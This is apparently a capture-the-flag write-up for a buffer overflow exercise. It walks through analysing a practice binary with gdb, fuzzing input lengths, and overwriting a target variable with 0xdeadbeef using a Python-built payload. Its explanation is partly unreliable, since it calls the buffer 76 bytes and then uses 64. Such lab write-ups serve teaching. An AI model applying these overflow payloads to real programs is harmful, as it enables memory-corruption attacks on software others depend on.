# ex05 - Buffer Overflow Exploitation

## Overview
The objective of this challenge is to manipulate a binary executable to change the value of a specific variable, ultimately triggering the message "you have hit the target correctly :)".

## Steps to Identify and Exploit the Vulnerability

### Initial Analysis
We started by identifying the type of the binary and looking for any useful strings within it:
```sh
file bin
strings bin 
```

This helped us understand the program's basic characteristics and locate any relevant messages or hints.

### Disassembly with GDB

Next, we used GDB to set breakpoints, run the program, and disassemble the binary:
```sh
`gdb bin
(gdb) break main
(gdb) run
(gdb) disassemble main
(gdb) disassemble vuln
```

By doing so, we found the `vuln` function and noted its structure.

### Finding the Buffer Size

We used trial and error to determine the buffer size that causes a segmentation fault, indicating overflow:

```sh

`./bin $(python -c "print 'A'*32")
./bin $(python -c "print 'A'*48")
./bin $(python -c "print 'A'*64")
./bin $(python -c "print 'A'*65")
./bin $(python -c "print 'A'*70")
./bin $(python -c "print 'A'*75")
./bin $(python -c "print 'A'*76")  # Causes a segmentation fault`
    
```

From this, we found that 76 bytes cause a segmentation fault, meaning the buffer size is 76.

### Crafting the Payload

We then crafted a payload that writes the target value `0xdeadbeef` at the correct location in memory:



```python
python -c "print 'A'*64 + '\xef\xbe\xad\xde'"
```

### Explanation

The payload worked because:

1.  **Buffer Size**: We filled the buffer with 64 'A' characters, which aligns with the start of the buffer.
2.  **Target Value**: `\xef\xbe\xad\xde` is the little-endian representation of `0xdeadbeef`, which is the value we need to set in the target variable.
3.  **Placement**: By placing `0xdeadbeef` right after the buffer, it correctly overwrites the target variable.

### Running the Exploit

We executed the binary with the crafted payload:

```sh
./bin $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")
```

This command successfully triggered the message:

```sh
you have hit the target correctly :)
```

Conclusion
----------

This exercise demonstrates the process of identifying a buffer overflow vulnerability, calculating the buffer size, and crafting a payload to manipulate program execution.

### Tools Used

-   `file`
-   `strings`
-   `gdb`
-   Python

### Educational Purpose

These methods and tools are used strictly for educational purposes to understand and protect against similar vulnerabilities.